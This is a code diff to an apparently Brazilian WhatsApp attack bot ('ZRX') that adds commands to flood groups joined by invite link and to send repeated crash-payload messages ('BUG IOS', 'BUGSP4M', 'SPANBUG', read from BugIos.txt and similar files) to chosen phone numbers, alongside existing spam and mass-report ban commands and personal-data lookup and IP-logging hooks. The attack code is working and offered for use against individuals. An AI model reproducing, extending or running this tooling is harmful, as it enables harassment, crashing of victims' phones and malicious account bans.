@@ -150,9 +150,13 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     `> /telefone <telefone>\n` +
                     `> /email <e-mail>\n` +
                     `> /cep <cep>\n` +
-                    `╠━━━⧼𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣⧽\n` +
-                    `> /SP4M <número> <quantidade>\n` +
-                    `> /B4N <número> <quantidade>\n` +
+                    `╠━━━⧼𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 & 𝗕𝗨𝗚𝗦⧽\n` +
+                    `> /SP4M <número> <qtd>\n` +
+                    `> /B4N <número> <qtd>\n` +
+                    `> /B4NGRUPO <link>\n` +
+                    `> /BUG <IOS> <número> <qtd>\n` +
+                    `> /BUGSP4M <número> <qtd>\n` +
+                    `> /SPANBUG <número> <qtd>\n` +
                     `┗━━━━━━━━━━━━━━━━━━━━━━┛`;
                 
                 const caminhoFoto = path.join(__dirname, 'menu.jpg');
@@ -261,7 +265,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 }
 
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
-                await waSock.sendMessage(remoteJid, { text: `🚀 Iniciando disparo da trava para ${alvoNum} (${quantidade} ciclos)...` });
+                await waSock.sendMessage(remoteJid, { text: `🚀 Iniciando disparo SP4M para ${alvoNum} (${quantidade} ciclos)...` });
 
                 for (let i = 1; i <= quantidade; i++) {
                     try {
@@ -295,6 +299,127 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     }
                 }
                 await waSock.sendMessage(remoteJid, { text: `✅ Ciclo de denúncias /B4N para ${alvoNum} finalizado!` });
+            }
+            else if (texto.startsWith('/B4NGRUPO ')) {
+                const linkGrupo = texto.replace('/B4NGRUPO', '').trim();
+                
+                if (!linkGrupo || !linkGrupo.includes('chat.whatsapp.com')) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/B4NGRUPO <link_do_convite>`' });
+                    return;
+                }
+
+                const matchCode = linkGrupo.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
+                if (!matchCode || !matchCode[1]) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Link de convite inválido!' });
+                    return;
+                }
+
+                const codigoConvite = matchCode[1];
+                await waSock.sendMessage(remoteJid, { text: `🔄 Tentando entrar no grupo via convite...` });
+
+                try {
+                    const idGrupo = await waSock.groupAcceptInvite(codigoConvite);
+                    await waSock.sendMessage(remoteJid, { text: `✅ Entrou no grupo com sucesso! (\`${idGrupo}\`). Iniciando disparos...` });
+
+                    for (let i = 1; i <= 15; i++) {
+                        await waSock.sendMessage(idGrupo, { text: `🚨 [ZRX-GROUP ATTACK #${i}/15] 🚨\nGrupo sob invasão e derrubada!` });
+                        await delay(1200);
+                    }
+
+                    await waSock.sendMessage(remoteJid, { text: `✅ Ataque ao grupo concluído!` });
+                } catch (err) {
+                    console.error("Erro ao atacar grupo:", err);
+                    await waSock.sendMessage(remoteJid, { text: `❌ Erro ao interagir com o grupo: ${err.message || 'Verifique se o link é válido.'}` });
+                }
+            }
+            else if (texto.startsWith('/BUG ')) {
+                const partes = texto.replace('/BUG', '').trim().split(' ');
+                // Exemplo: /BUG IOS 5511999999999 10
+                const tipoBug = partes[0]?.toUpperCase();
+                const alvoNum = partes[1]?.replace(/\D/g, '');
+                const quantidade = parseInt(partes[2]) || 10;
+
+                if (tipoBug !== 'IOS' || !alvoNum) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/BUG <IOS> <número> <quantidade>`' });
+                    return;
+                }
+
+                let conteudoBugIos = "🍎 [ZRX-BUG IOS CRASH] 💥 Payload ativado para travamento de dispositivos Apple.";
+                const caminhoBugIos = path.join(__dirname, 'BugIos.txt');
+                if (fs.existsSync(caminhoBugIos)) {
+                    conteudoBugIos = fs.readFileSync(caminhoBugIos, 'utf-8');
+                }
+
+                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
+                await waSock.sendMessage(remoteJid, { text: `🍎 Iniciando envio de /BUG IOS para ${alvoNum} (${quantidade} ciclos)...` });
+
+                for (let i = 1; i <= quantidade; i++) {
+                    try {
+                        await waSock.sendMessage(jidAlvo, { text: `${conteudoBugIos}\n\n[Ciclo IOS ${i}/${quantidade}]` });
+                        await delay(1000);
+                    } catch (err) {
+                        console.log(`Erro no ciclo IOS ${i}:`, err.message);
+                    }
+                }
+                await waSock.sendMessage(remoteJid, { text: `✅ Disparo /BUG IOS para ${alvoNum} concluído!` });
+            }
+            else if (texto.startsWith('/BUGSP4M ')) {
+                const partes = texto.replace('/BUGSP4M', '').trim().split(' ');
+                const alvoNum = partes[0]?.replace(/\D/g, '');
+                const quantidade = parseInt(partes[1]) || 10;
+
+                if (!alvoNum) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/BUGSP4M <número> <quantidade>`' });
+                    return;
+                }
+
+                let conteudoBugSpam = "⚡ [ZRX-BUGSP4M] 💥 Ataque de spam pesado em andamento!";
+                const caminhoBugSpam = path.join(__dirname, 'BugSpam.txt');
+                if (fs.existsSync(caminhoBugSpam)) {
+                    conteudoBugSpam = fs.readFileSync(caminhoBugSpam, 'utf-8');
+                }
+
+                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
+                await waSock.sendMessage(remoteJid, { text: `⚡ Iniciando envio de /BUGSP4M para ${alvoNum} (${quantidade} ciclos)...` });
+
+                for (let i = 1; i <= quantidade; i++) {
+                    try {
+                        await waSock.sendMessage(jidAlvo, { text: `${conteudoBugSpam}\n\n[Ciclo BugSpam ${i}/${quantidade}]` });
+                        await delay(900);
+                    } catch (err) {
+                        console.log(`Erro no ciclo BugSpam ${i}:`, err.message);
+                    }
+                }
+                await waSock.sendMessage(remoteJid, { text: `✅ Disparo /BUGSP4M para ${alvoNum} concluído!` });
+            }
+            else if (texto.startsWith('/SPANBUG ')) {
+                const partes = texto.replace('/SPANBUG', '').trim().split(' ');
+                const alvoNum = partes[0]?.replace(/\D/g, '');
+                const quantidade = parseInt(partes[1]) || 10;
+
+                if (!alvoNum) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/SPANBUG <número> <quantidade>`' });
+                    return;
+                }
+
+                let conteudoSpanBug = "🌀 [ZRX-SPANBUG] 💀 Loop infinito de caracteres e travamento!";
+                const caminhoSpanBug = path.join(__dirname, 'SpanBug.txt');
+                if (fs.existsSync(caminhoSpanBug)) {
+                    conteudoSpanBug = fs.readFileSync(caminhoSpanBug, 'utf-8');
+                }
+
+                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
+                await waSock.sendMessage(remoteJid, { text: `🌀 Iniciando envio de /SPANBUG para ${alvoNum} (${quantidade} ciclos)...` });
+
+                for (let i = 1; i <= quantidade; i++) {
+                    try {
+                        await waSock.sendMessage(jidAlvo, { text: `${conteudoSpanBug}\n\n[Ciclo SpanBug ${i}/${quantidade}]` });
+                        await delay(900);
+                    } catch (err) {
+                        console.log(`Erro no ciclo SpanBug ${i}:`, err.message);
+                    }
+                }
+                await waSock.sendMessage(remoteJid, { text: `✅ Disparo /SPANBUG para ${alvoNum} concluído!` });
             }
             else if (texto.trim() === '/linkIP') {
                 const idUnico = 'zrx_' + Math.random().toString(36).substring(2, 8);
